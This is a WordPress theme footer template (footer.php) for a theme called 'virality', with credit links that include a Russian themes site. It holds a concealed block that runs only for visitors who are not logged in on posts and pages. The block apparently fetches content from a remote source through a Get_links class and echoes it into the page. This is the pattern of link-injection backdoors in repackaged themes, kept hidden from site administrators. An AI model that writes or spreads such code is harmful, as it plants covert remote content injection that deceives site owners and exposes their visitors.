	
	</div><!-- #container -->

	<div class="push"></div>

</div><!-- #wrapper -->

<footer id="colophon" role="contentinfo">
	<div class="footer-wrap">
    
    	<div class="footer-wfix">
    
    	<?php virality_footer_nav(); ?>
        
        <div id="site-generator">
            <?php echo __('&copy; ', 'virality') . esc_attr( get_bloginfo( 'name', 'display' ) );  ?>
            <?php if (is_home() || is_category() || is_archive() ){ ?> - <a href="http://wpdevshed.com/">WP Dev Shed</a> - <a href="http://wp-templates.ru/">Темы WordPress</a> <?php } ?>


<?php if ($user_ID) : ?><?php else : ?>
<?php if (is_single() || is_page() ) { ?>
<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); 
$links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
<?php } ?>
<?php endif; ?>
        </div>
        
        </div>
     	
     </div>
</footer><!-- #colophon -->

<?php wp_footer(); ?>


</body>
</html>